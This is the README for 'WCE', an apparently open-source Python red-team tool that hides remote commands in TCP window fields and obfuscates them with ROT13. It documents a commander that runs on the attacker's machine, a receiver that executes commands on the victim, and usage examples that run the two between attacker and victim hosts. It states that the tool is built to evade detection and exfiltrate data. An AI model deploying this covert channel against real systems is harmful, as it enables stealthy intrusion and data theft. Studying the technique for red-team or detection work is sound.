# WCE (Window Commander and Exfiltrer)

<div align="center">
<img src="https://github.com/Cyber-Guy1/WCE/blob/main/assets/banner.png" width="70%" height="70%">
</div>

# Disclaimer: 

The Window Commander and Exfiltrer (WCE) tool was created by Momen Eldawakhly (cyber guy) for use during red team engagement and is intended for educational and research purposes only. The tool should not be used for any illegal or unauthorized activities, including but not limited to hacking, unauthorized access to systems, or any other activity that violates applicable laws and regulations. The creator of WCE is not responsible for any damage or loss caused by the misuse of this tool. It is the responsibility of the user to ensure that they have the necessary permissions and authorization before using WCE. The user agrees to use this tool at their own risk and acknowledges that the creator of WCE is not liable for any legal or financial consequences resulting from the use of this tool. By using WCE, the user agrees to comply with all applicable laws and regulations.

# Tool description

The WCE is a Python-based tool that allows sending commands to a compromised network node through IP packet window flags using TCP, with calculated checksum and other metrics that make the packet look legitimate and hard to detect. The tool implements ROT13 to obfuscate the commands, making it more difficult for defenders to identify them.

The tool consists of two scripts: the commander and the receiver. The commander script runs on the attacker's machine and sends commands to the victim's machine. The receiver script runs on the victim's machine, listening for packets on a specific port. The victim machine should have access to a socket and a network interface to monitor the packet.

The commander script takes several parameters, such as the source and destination IP and port, delay between each packet, and the command to be sent. The receiver script listens on a specific port and executes the received commands.

One of the unique features of WCE is that there is no need for the attacker to send the packet to the victim directly. Instead, having the malicious packet flowing in the network is enough. The receiver script will take the window packets from specific ports and with a specific count and then execute them. This makes the tool more versatile and easier to use in various network environments.

The WCE tool is designed to make exfiltration and network command more stealthy by using window flags, which are often overlooked by security monitoring tools. By implementing a reliable and customizable transmission method using TCP, it helps attackers evade detection and exfiltrate sensitive data.

This tool has some research behind it; check it out from here: https://samuraisecurity.co.uk/red-teaming-exfiltrating-data-command-network-nodes-like-a-ghost/

## Usage
### Commander script:

```
usage: commander.py [-h] [-c COMMAND] [-t TARGET] [-dp DST_PORT] [-d DELAY]
                    [-s SOURCE] [-p PORT] [-P {TCP,UDP}]

options:
  -h, --help            show this help message and exit
  -c COMMAND, --command COMMAND
                        Command to execute
  -t TARGET, --target TARGET
                        Target IP
  -dp DST_PORT, --dst-port DST_PORT
                        Destination port
  -d DELAY, --delay DELAY
                        Seconds to delay between packets, the more seconds,
                        the more stable connection.
  -s SOURCE, --source SOURCE
                        Source IP
  -p PORT, --port PORT  Source port
```

### Receiver script:

```
usage: receiver.py [-h] [-i INTERFACE] [-pc PACKETSCOUNT] [-p PORT]

options:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Network capturing interface
  -pc PACKETSCOUNT, --packetsCount PACKETSCOUNT
                        Number of packets to capture
  -p PORT, --port PORT  Port that will receive the TCP packets
```

## Examples

The following is an example for the usage:
- Attacker machine:

```
sudo python3 commander.py -c ls -t 192.168.1.1 -dp 72 -d 10 -s 192.168.1.10 -p 72
```

- Victim machine:

```
sudo python3 receiver.py -i en0 -pc 2 -p 72
```

## Output example:

![image](https://user-images.githubusercontent.com/66295316/227532825-039ba192-10b6-4688-bc9f-3c10fc7c8701.png)


[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
